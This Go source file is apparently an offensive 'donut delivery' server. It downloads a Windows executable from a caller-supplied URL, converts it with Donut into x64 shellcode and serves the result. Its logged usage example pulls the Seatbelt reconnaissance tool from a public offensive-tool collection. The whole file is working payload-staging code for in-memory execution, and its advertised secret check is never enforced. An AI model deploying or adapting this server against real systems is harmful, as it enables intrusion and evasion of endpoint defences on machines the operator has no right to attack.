package main

import (
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"time"
)

type FlagOptions struct {
	addr         string
	path         string
	url_param    string
	args_param   string
	secret       string
	secret_param string
}

type DonutDelivery struct {
	opts *FlagOptions
}

func randomString(length int) string {
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, length+2)
	rand.Read(b)
	return fmt.Sprintf("%x", b)[2 : length+2]
}

func options() *FlagOptions {
	addr := flag.String("l", "127.0.0.1:8087", "The listening address of the server")
	path := flag.String("path", "/donut", "HTTP path to be used for donut delivery")
	url_param := flag.String("up", "", "HTTP parameter where the PE url will be sent (default Random)")
	if *url_param == "" {
		*url_param = randomString(4)
	}
	args_param := flag.String("ap", "", "HTTP parameter where the comma separated PE arguments will be sent (default Random)")
	if *args_param == "" {
		*args_param = randomString(4)
	}
	secret := flag.String("secret", "", "Secret to be sent in the requests along with the PE url (Authorization header if param not defined). No authentication if not defined.")
	secret_param := flag.String("sp", "", "HTTP paramter where the secret will be sent (instead of Authorization token header)")
	flag.Parse()
	return &FlagOptions{*addr, *path, *url_param, *args_param, *secret, *secret_param}
}

func HTTPDownload(uri string) ([]byte, error) {
	log.Printf("HTTPDownload From: %s.\n", uri)
	res, err := http.Get(uri)
	if err != nil {
		log.Fatal(err)
	}
	defer res.Body.Close()
	d, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("ReadFile: Size of download: %d\n", len(d))
	return d, err
}

func (dd *DonutDelivery) deliverDonut(w http.ResponseWriter, r *http.Request) {
	peUrl := r.URL.Query().Get(dd.opts.url_param)
	if peUrl == "" {
		io.WriteString(w, "")
		return
	}
	log.Println(peUrl)
	data, err := HTTPDownload(peUrl)
	if err != nil {
		io.WriteString(w, "")
		return
	}
	// func DonutFromAssembly(assembly []byte, isDLL bool, arch string, params string, method string, className string, appDomain string) ([]byte, error) {
	params := r.URL.Query().Get(dd.opts.args_param)
	log.Println(params)

	donut, err := DonutFromAssembly(data, false, "x64", params, "", "", "")
	if err != nil {
		io.WriteString(w, "")
		return
	}
	w.Write(donut)
}

func main() {
	opts := options()
	dd := &DonutDelivery{
		opts,
	}

	//HTTPs magic
	// mux := http.NewServeMux()
	// mux.HandleFunc(opts.path, dd.deliverDonut)
	// err := certmagic.HTTPS([]string{"example.com", "www.example.com"}, mux)

	log.Printf("Starting donut delivery server on %s", opts.addr)
	log.Printf("PE url parameter:\t%s\n", opts.url_param)
	log.Printf("PE arg parameter:\t%s\n", opts.args_param)
	log.Printf("URL format example: http://%s%s?%s=https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Seatbelt.exe&%s=antivirus", opts.addr, opts.path, opts.url_param, opts.args_param)
	http.HandleFunc(opts.path, dd.deliverDonut)
	if err := http.ListenAndServe(opts.addr, nil); err != nil {
		log.Fatal("HTTP server failed:", err)
	}

}
